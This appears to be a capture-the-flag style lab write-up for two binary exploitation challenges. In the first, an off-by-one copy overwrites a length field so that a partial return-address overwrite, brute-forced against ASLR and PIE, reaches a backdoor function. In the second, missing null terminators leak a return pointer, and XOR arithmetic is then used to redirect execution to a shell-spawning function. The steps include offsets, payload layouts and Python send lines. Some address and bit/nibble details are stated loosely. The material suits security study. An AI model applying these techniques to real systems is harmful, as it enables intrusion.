In this lab we are handling tweets once again. We have 4 interesting functions:
	* ```handle_tweet``` - makes calls to the other 2 functions
	* ```set_username``` - as the name implies, asks as to insert a username
	* ```set_tweet``` - as the name implies, asks as to insert a tweet
	* ```secret_backdoor``` - allows us to execute systems() commands, but we can't access it.

The ```handle_tweet``` function is called once, therefore we will only insert one username and one tweet.
The username and tweet are stored in a ```struct```.

```c
struct savestate {
    char tweet[140];
    char username[40];
    int msglen;
} save;
```

When setting the username, we can see that first it will put our input in an array with a call to fgets. It will then go through a for loop and copy byte after byte into our ```save->username```. This is where the flaw comes in:

```c
for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];
```

As we can see, it writes one more byte and so will overwrite ```int msglen```, which was set to 140 before. As such, we can set ```msglen``` to any value we want and so we can overflow the ```tweet[140]``` buffer and change the ```ret``` pointer of ```handle_tweet``` to ```secret_backdoor```.

This is our first challenge with ```ASLR``` and ```PIE``` enabled, so you bet that the address are not static at all.

Here are the addresses of the original ```ret``` pointer and the address of ```secret_backdoor```.

```
0xb7757 98a - ret
0xb7757 72b - secret_backdoor
```

Here they are again after being modified in by PIE.

```
0xb7731 98a - ret
0xb7731 72b - secret_backdoor
```

As you can see, the higher ```5 bits``` are the same in both addresses. Therefore, we would only need to modify the last ```3 bits```. Since, at minimum, we can modify one byte at a time, we will have to modify the last ```2 bytes```/```4 bits``` and pray to God that the 4th last bit matches.

In conclusion, we have to perform a ```brute force```. It should work 1 out of 16 times.
Note that we will have to set ```msglen``` accordingly, so that we overwrite only the ```local variables```, ```base pointer``` and 2 bytes off of ```ret```. From the ```struct``` to ```base pointer``` there are ```192 byte``` => ```192 + 4 + 2 = 198 bytes``` => ```msglen``` will be set to ```\xC6.```

## lab6B

This is our first remote challenge!

In ```main``` we can see that the binary makes calls in order to read and store the flag on the ```heap```. It will then make a call to ```hash_pass``` in order to modify the ```password```.
It will then make a call to ```login_prompt```, the focus of this challenge.

This is ```hash_pass```:

```c
void hash_pass(char * password, char * username)
{
    int i = 0;

    /* hash pass with chars of username */
    while(password[i] && username[i])
    {  
        password[i] ^= username[i];
        i++;
    }  

    /* hash rest of password with a pad char */
    while(password[i])
    {  
        password[i] ^= 0x44;
        i++;
    }  

    return;
}
```

It's pretty clear what it does. It ```xor```'s every character from ```password``` with its ```username``` index counterpart, so long none of them are zero. After that, if ```password``` still has characters left unhashed, it will ```xor``` with ```0x44``` ('D').

Now let's look at ```login_prompt```. At first glance, it seems that the function seems secure enough.

* ```attempts``` variable is initialized with ```-3```
* ```result``` variable is initialized with ```-1```
* It goes through a ```while``` loop with the condition ```attempts++ != 0```
* in every iteration of the loop it sets the buffers ```password```, ```username``` and ```readbuff``` to 0s.
* It will read from stdin with ```fgets``` and stores it in ```readbuff```
* It will perform ```strncpy``` to store the input into ```password``` and ```username``` respectively, using ```sizeof``` to * determine the number of bytes copied
* calls ```hash_pass``` with our ```password``` and our ```username``` as arguments
* compares our password and flag.
* If ```equal```, it will make a call to ```login()``` - the win function which spawns a shell.
* If ```not equal```, will ```display our username string``` and go through the loop
* when the loop finishes, it returns ```result```

Now where is the problem here? Well, as things work in ```C language```, whenever we have an ```array of characters```, we have to make sure that we also reserve one byte for our ```NULL``` character, to determine the end of our string.

```c
    char password[32];
    char username[32];
    char readbuff[128];
    int attempts = -3;
    int result = -1;
```

When ```strncpy``` is performed, ```sizeof``` will return ```32 bytes``` and, subsequently, we will copy 32 bytes from ```readbuff``` into ```username``` or ```password``` buffer, completely omitting to insert a ```NULL``` character at the end! If we look into memory, this is the placement of our buffers:

```asm
[84:88] ebp + 4    - RET
[80:84] ebp        - base pointer
[76:80] ebp - 0x04 - trash
[72:76] ebp - 0x08 - trash
[68:72] ebp - 0x0c - attempts
[64:68] ebp - 0x10 - result
[32:64] ebp - 0x30 - password
[0:32]  ebp - 0x50 - username
```

Now, here gets the fun part. Since there are no ```NULL characters```, when 
```c
printf("Authentication failed for user %s\n", username);
``` 
will be called it will print the whole ```stack```, including the ```ret``` pointer, which provides us an ```information leak``` and means to determine the correct address of ```login()```!

Thing is, since we don't have ```NULL characters``` for our ```username``` and ```password``` strings, our ```hash_pass``` function will go bonkers. Normally, it will stop since eventually both buffers will reach their end. But with that missing, it will continue on hashing!

So this is how it will work now. The ```password buffer```, the first 32 bytes will be hashed normally and its bytes values will basically be ```password[i] ^ username[i]```. But we will not stop hashing there. Continuing, we will hash everything afterwards with the values in the password buffer - not the old ones but the ones freshly hashed!

So basically, after finishing hashing, the value in place of our ```ret``` pointer will be ```ret[i] ^ (password[i] ^ username[i])```. As such, in our first phase (the information leak), to find the value of ```ret``` we will have to to perform 2 xor's to get to the original value.

I send ```32 "A"s``` as my ```username``` and ```32 "\x03"``` as my ```password```. ```0x41 ^ 0x03 = 0x42 = "B"```. So I will have to ```xor``` the modified ```ret``` with ```0x42424242``` to get to the orginal value.

Once we find out the value of ```ret```, we have to find out te address of ```login()```. The only difference between them is the last 3 ```nibbles``` -> ```0xaf4```. We make a simple bitwise operation and voila!

```python
login = (ret & 0xfffff000) + 0xaf4
```

Now for ```phase 2``` and the hard part. Since we can hash ```ret```, we basically can change it to any value we want. We also have to change the value of ```attempts``` since we obstructed it last time and we need to exit the loop in order to exit the function. Since we cannot set it to zero because of the NULL bytes, we will set it to ```-1```.

* set ```ret``` to point to ```login()```
* set ```attempts``` to ```-1```

We have to keep in mind that our ```ret``` and ```attempts``` variables have been obstructed due to our previous ```hash```. We call these 2 values ```bad_ret``` and ```bad_attempts```.

Basically,
```bad_ret ^ (username ^ passwordRet) = login```

We know the values of ```bad_ret```, ```login```. Let's say that ```username``` is once again ```32 "A"s```. We need to find the value of ```password``` then.

```
0x41414141 ^ passwordRet = bad_ret ^ login 
passwordRet = bad_ret ^ login ^ 0x41414141
```

This applies to ```attempts``` as well.

```
passwordAttempts = bad_attempts ^ 0xFEFFFFFF ^ 0x41414141
```

Once we got these values down, we simply have construct them in our ```password```.

```python
# username
r.sendline ("A" * 32)

# result, attempts, trash, trash, base pointer, ret, padding
r.sendline ("BBBB" + passwordAttempts + "BBBB" + "BBBB" + "CCCC" + passwordRet + "DDDDDDDD")
```

Oh and don't forget to add ```padding``` at the end so that there are no ```NULL characters```. And that's it!
